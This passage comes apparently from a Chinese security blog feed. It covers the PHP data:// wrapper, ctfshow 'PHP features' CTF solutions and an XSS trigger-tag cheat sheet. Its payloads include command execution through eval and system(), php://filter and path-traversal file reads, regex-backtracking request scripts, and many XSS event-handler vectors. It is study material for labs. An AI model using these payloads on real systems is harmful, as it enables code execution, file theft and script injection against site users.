title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>用法：</p><pre><code class="awk">data://text/plain,data://text/plain;base64,</code></pre><p>格式：data:资源类型(MIME类型);编码,内容</p><p>示例：</p><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>data类型扩展</p><pre><code>data:,&lt;文本数据&gt;data:text/plain,&lt;文本数据&gt;data:text/html,&lt;HTML代码&gt;data:text/html;base64,&lt;base64编码的HTML代码&gt;data:text/css,&lt;CSS代码&gt;data:text/css;base64,&lt;base64编码的CSS代码&gt;data:text/javascript,&lt;Javascript代码&gt;data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;data:image/gif;base64,base64编码的gif图片数据data:image/png;base64,base64编码的png图片数据data:image/jpeg;base64,base64编码的jpeg图片数据data:image/x-icon;base64,base64编码的icon图片数据</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性(ctfshow)</title>
      <link href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"/>
      <url>/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>preg_match()只能处理字符串，当传入的是数组时将会返回false</p><p><strong>intval(mixed $value, int $base &#x3D; 10): int</strong></p><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 <strong>intval()</strong> 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155817.png" class=""><p>注：除非value是一个字符串，否则base不会起作用</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155907.png" class=""><pre><code>payload:?num[]=1</code></pre><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>还是考察intval函数，看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/161305.png" class=""><pre><code>payload:?num=0x117c      #0x117c是4476的16进制</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/213407.png" class=""><p>首先是：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;im’, $a))</p><p>&#x2F;^php$&#x2F;im 表示用php匹配开头和结尾，不区分大小写，并且多行匹配</p><p>再次：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;i’, $a))</p><p>与上面的区别是没有多行匹配，这可以用到Apache HTTPD换行解析漏洞（CVE-2017-15715）–(<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a>)</p><pre><code>payload:?cmd=abc%0aphp</code></pre><p>a%0aphp，首先是preg_match中的$(匹配结尾)匹配a%0aphp中的换行符，这个时候会匹配到%0a（将%0a当作换行），那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php</p><p>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag</p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><p>还是考察intval()函数特性</p><pre><code>pyload:?cmd=4476.1</code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>这里过滤了a-z和A-Z，不能用16进制编码，但能用8进制编码，用小数也可以绕过。这里我们用8进制编码一下</p><pre><code>payload:?cmd=010574</code></pre><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>看源码</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/223456.png" class=""><p>这里增加了strpos()函数</p><p><strong>strpos(string $haystack, string $needle, int $offset &#x3D; 0): int|false</strong></p><p>返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p><p>所以，这里的if(!strpos($num, “0”))是过滤了出现在字符串首位的0，即屏蔽了8进制</p><pre><code>payload:?num=4476.01</code></pre><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><p>这关直接过滤了点，发现用+号可以绕过</p><pre><code>payload:?cmd=+010574 或 ?cmd=%2b010574</code></pre><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>这里用相对路径</p><pre><code>payload:?u=./flag.php</code></pre><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>数组绕过</p><pre><code>POST a[]=1&amp;b[]=2</code></pre><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>由源码含义可构造payload:</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/110924.png" class=""><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113547.png" class=""><p><strong>in_array()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113721.png" class=""><p><strong>file_put_contents()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113902.png" class=""><p>直接构造，然后用蚁剑连接</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/115539.png" class=""><p>get数据可以多次尝试</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/142455.png" class=""><p><strong>is_numeric(mixed $value): bool</strong></p><p>检测指定的变量是否为数字或数字字符串。</p><p>这题的重点是and or和&amp;&amp; ||的区别，区别是优先级不同，后者的优先级高于&#x3D;，前者的优先级低于&#x3D;。所以这里只要构造v1等于一个数字即可。</p><pre><code>?v1=23&amp;v2=system(&#39;ls&#39;)&amp;v3=;?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=highlight_file(&quot;ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>这一关几乎所有能用的都过滤了，这里要用到ReflectionClass反射类。</p><p>参考:<a href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p><p>​<a href="https://www.cnblogs.com/benbenhan/p/12572649.html">https://www.cnblogs.com/benbenhan/p/12572649.html</a></p><p>最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass(‘ctfshow’);</p><pre><code>payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/162642.png" class=""><p><strong>call_user_func(callable $callback,mixed …$args):mixed</strong></p><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><p>我们梳理一下这一关的思路：首先v3得是一个文件名，然后v2应该是一句话，但这里要绕过is_numeric()，并且要经过名为v1的函数转换，所以v2得是一句话经过处理成为纯数字，这里我们选v2&#x3D;’&lt;?&#x3D;<code>cat *</code>;’;,再经过base64和16进制编码后成为PD89YGNhdCAqYDs&#x3D;,等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，再转换为16进制，得到5044383959474e6864434171594473（注：如果此处使用bin2hex()函数，这个函数是先将字符串的ascii对应的二进制找出来，再将二进制码转换成16进制，所以如果用在线编码转换的话应先将字符串先base64编码，再用ascii转16进制）。</p><p>这一关要使用php:&#x2F;&#x2F;filter伪协议。</p><pre><code>payload:GET v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64- decode/resource=1.php         POST v1=hex2bin</code></pre><p>最后再访问1.php。</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><p>同上</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre><code>payload: GET v2=ddd         POST v1=ddd</code></pre><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/205755.png" class=""><p>考察变量覆盖，这里有个php的小特性就是变量不需要声明</p><pre><code>payload GET a=flag        POST error=a</code></pre><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><p>参考<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p><pre><code>payload: GET v2[]=1         POST v1[]=2</code></pre><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/215655.png" class=""><pre><code>payload: GET v3=QNKCDZO         POST v1=flag=0</code></pre><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>考察ereg()截断漏洞.参考:<a href="https://blog.csdn.net/qq_25987491/article/details/79952393">https://blog.csdn.net/qq_25987491/article/details/79952393</a></p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符大小写敏感</p><p>这里ereg有两个漏洞：<br>①%00截断及遇到%00则默认为字符串的结束<br>②当ntf为数组时它的返回值不是FALSE</p><p>数组绕过匹配:<br>第一步首先要过ereg，可以用%00截断<br>第二部0x36d是十进制877，逆操作经过strrev为778</p><pre><code>payload c=a%00778</code></pre><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><p>只要让new后面有个类不报错以后，就可以随意构造</p><pre><code>?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</code></pre><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><p>考察FilesystemIterator类</p><pre><code>payload ?v1=FilesystemIterator&amp;v2=getcwd</code></pre><p>缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。</p><p><strong>getcwd(): string|false</strong></p><p>取得当前工作目录。</p><p><strong>FilesystemIterator</strong> 遍历文件的类 </p><p><strong>DirctoryIntrerator</strong> 遍历目录的类</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><p>这里用全局变量GLOBALS</p><p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>注：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。所以这里v2要用超全局变量GLOBALS,不能直接用flag。</p><pre><code>payload  ?v1=ctfshow&amp;v2=GLOBALS</code></pre><h5 id="使用超全局变量-GLOBALS可以代替global"><a href="#使用超全局变量-GLOBALS可以代替global" class="headerlink" title="使用超全局变量$GLOBALS可以代替global"></a>使用超全局变量$GLOBALS可以代替global</h5><pre><code>&lt;?php      $num1 = 5;      //全局变量     $num2 = 13;     //全局变量    function global_var()      &#123;              $sum = $GLOBALS[&#39;num1&#39;] + $GLOBALS[&#39;num2&#39;];              echo &quot;全局变量求和结果 &quot; .$sum;      &#125;      global_var();  ?&gt;  </code></pre><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><p><strong>is_file(string $filename): bool</strong></p><p>如果文件存在且为正常的文件则返回 true，否则返回 false。</p><p>这一关要传入一个不存在的文件名还要把文件内容显示出来，我们这里还是用php伪协议。</p><pre><code>payload ?file=php://filter/resource=flag.php</code></pre><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p>这题用到伪协议zlib:&#x2F;&#x2F;</p><pre><code>payload ?file=compress.zlib://flag.php</code></pre><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>没有过滤php和filter</p><pre><code>?file=php://filter/resource=flag.php</code></pre><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/214923.png" class=""><p>这一关用%0c来绕过trim()函数</p><pre><code>payload ?num=%0c36</code></pre><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><p>这一关比较容易想出来fun&#x3D;echo $flag，但是没有回显，通过排查发现是$CTF_SHOW.COM的问题，看别人题解果然是，并且是因为是变量里有个点：</p><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><p>可以参考一下y4的博客<a href="https://blog.csdn.net/solitudi/article/details/120502141">https://blog.csdn.net/solitudi/article/details/120502141</a></p><p> (反正我也看不懂)，总之先记住这个性质。其实出现了[之后php就会去找]，如果找到了那就是数组，没有找到就被被解析成_</p><pre><code>payload CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></pre><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><p>这一关屏蔽了echo、flag。我们这里用创造一个新变量，巧妙利用highlight_file()</p><pre><code>payload CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=highlight_file($_POST[fff])&amp;fff=flag.php</code></pre><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><p>直接过滤了g、i、f…，要利用$_SERVER[‘argv’]。</p><p><em>$_SERVER</em> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p><strong>$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]</strong><br>query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据</p><p>可以用+来进行分隔，使得数组中有多个数值。</p><p>注：在web页模式下必须在php.ini开启register_argc_argv配置项</p><pre><code>payload GET a=1+$fl0g=flag_give_me;        POST CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=eval($a[1])</code></pre><p>注意分号。</p><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><p><strong>extract(array &amp;$array, int $flags &#x3D; EXTR_OVERWRITE, string $prefix&#x3D; “”): int</strong></p><p>本函数用来将变量从数组中导入到当前的符号表中。</p><p>array:一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</p><p>这一关一直卡在CTF_SHOW的下划线的过滤上，看别人题解才发现还有个空格没用上</p><pre><code>payload ?ctf show=ilove36d</code></pre><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><p>这关操作确实有点骚。。。</p><p>复述一下大佬的做法：（做这道题的时候正好堆堆推门而入取水来了，不得让他表演一下。。。不过大佬就是大佬）</p><p>使用**gettext()**拓展，开启此拓展_() 等效于 gettext()</p><pre><code>echo _(&quot;hahahaha&quot;);//输出结果：hahahaha</code></pre><p>接下来到第二层call_user_func，可以使用get_defined_vars函数</p><p><strong>get_defined_vars ( void ) : array</strong> 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><pre><code>payload ?f1=_&amp;f2=get_defined_vars</code></pre><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><p>这题看到readfile第一反应是php伪协议，但要包括ctfshow，搞了一会不行，看别人题解发现放到过滤器参数里就可以，无效的东西会被忽略</p><pre><code>payload f=php://filter/ctfshow/resource=flag.php</code></pre><p>解法2：文件穿越，把ctfshow当作当前目录下的一个文件</p><pre><code>?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</code></pre><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><p>第一下随便传了个f&#x3D;ctfshow想试试代码中的正则是什么作用，结果爆出了flag。。。</p><p>.表示任意单个字符，+表示必须匹配1次或多次，？表示匹配0次或1次·，所以+?表示 重复1次或更多次</p><pre><code>payload f=ctfshow</code></pre><p>还有一种做法：通过数组来绕过，stripos应用于数组的时候会返回null，null!&#x3D;&#x3D;false</p><pre><code>payload f[]=1</code></pre><p>其实这道题的意图是通过回溯限制来绕过。</p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false</p><p>脚本发包：</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;ctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><p>这一关只能用回溯了</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;36Dctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>进入admin目录</p><p>&amp;&amp;优先级高于||，所以</p><pre><code>paylaod ?username=admin&amp;code=admin&amp;password=fdsf</code></pre><h3 id="web133"><a href="#web133" class="headerlink" title="***web133"></a>***web133</h3><p>这题看看出题人的博客 <a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><pre><code>我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令**那为什么会这样？**因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是``$F`;+sleep 3`,就执行成功这里可能有点绕，慢慢理解</code></pre><p><strong>shell_exec</strong> — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p><p>所以这里没办法回显</p><p>这一关要弹什么shell，以后再看</p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。（parse_str以&amp;来分割字符串）</p><pre><code>payload ?_POST[key1]=36d&amp;_POST[key2]=36d</code></pre><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><p>这一关屏蔽了很多东西，我们用linux命令cp或uniq</p><pre><code>payload ?F=`$F` ;cp flag.php 2.txt;         ?F=`$F` ;uniq flag.php&gt;4.txt;</code></pre><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><p><strong>exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code&#x3D; null): string|false</strong></p><p>exec()执行 command 参数所指定的命令。</p><p>这关屏蔽了&lt;&gt;和.，又来一个新姿势：</p><pre><code>tee a.txt b.txt，将a.txt复制到b.txt ls | tee b.txt,将ls命令的执行结果写入b.txt</code></pre><p>先执行?c&#x3D;ls &#x2F;|tee ls,然后访问ls.txt</p><p>会让你下载文件，</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/135803.png" class=""><p>然后执行 ?c&#x3D;tac &#x2F;f149_15_h3r3|tee flag，访问&#x2F;flag</p><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><p>用**call_user_func()**来调用一个类里面的方法</p><pre><code>payload ctfshow=ctfshow::getFlag</code></pre><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><p>屏蔽了冒号，还可以用数组来调用类里的方法</p><pre><code>payload ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></pre><h3 id="web139"><a href="#web139" class="headerlink" title="***web139"></a>***web139</h3><p>要用到什么shell编程和盲注，还是暂放亿下。。。</p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><p>“ctfshow”字符串与数字比较时被转换为0，所以这关随便胡写俩个函数使最后的结果为null就行</p><pre><code>payload f1=intval&amp;f2=intval</code></pre><h3 id="web141"><a href="#web141" class="headerlink" title="***web141"></a>***web141</h3><p>\W匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]。</p><p>无数字字母rce……</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>这关没难度</p><pre><code>payload v1=0</code></pre><h3 id="web143-150"><a href="#web143-150" class="headerlink" title="***web143-150"></a>***web143-150</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss常见的触发标签</title>
      <link href="/2023/03/28/xss%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/"/>
      <url>/2023/03/28/xss%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><p>&lt;script&gt;</p><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></pre><p>&lt;img&gt;</p><pre><code>图片加载错误时触发&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;鼠标指针移动到元素时触发&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;鼠标指针移出时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;a&gt;</p><pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;</code></pre><p>&lt;input&gt;</p><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;竞争焦点，从而触发onblur事件&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;松开按键式时触发&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;from&gt;</p><pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;&lt;form action=1 onmouseover=alert(&#39;xss)&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>&lt;iframe&gt;</p><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)</code></pre><p>&lt;svg&gt;</p><pre><code>&lt;svg onload=alert(1)&gt;</code></pre><p>&lt;body&gt;</p><pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><p>&lt;button&gt;</p><pre><code>元素上点击鼠标时触发&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code></pre><p>&lt;p&gt;</p><pre><code>元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;details&gt;</p><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;select&gt;</p><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt;</code></pre><p>&lt;video&gt;</p><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;audio&gt;</p><pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>&lt;textarea&gt;</p><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><p>&lt;keygen&gt;</p><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><p>&lt;marquee&gt;</p><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><p>&lt;isindex&gt;</p><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><p>利用link远程包含js文件</p><pre><code>在无CSP的情况下才可以&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><p>javascript伪协议</p><pre><code>&lt;a&gt;标签&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;&lt;iframe&gt;标签&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;&lt;img&gt;标签&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下&lt;form&gt;标签&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><p>expression属性</p><pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下&lt;div 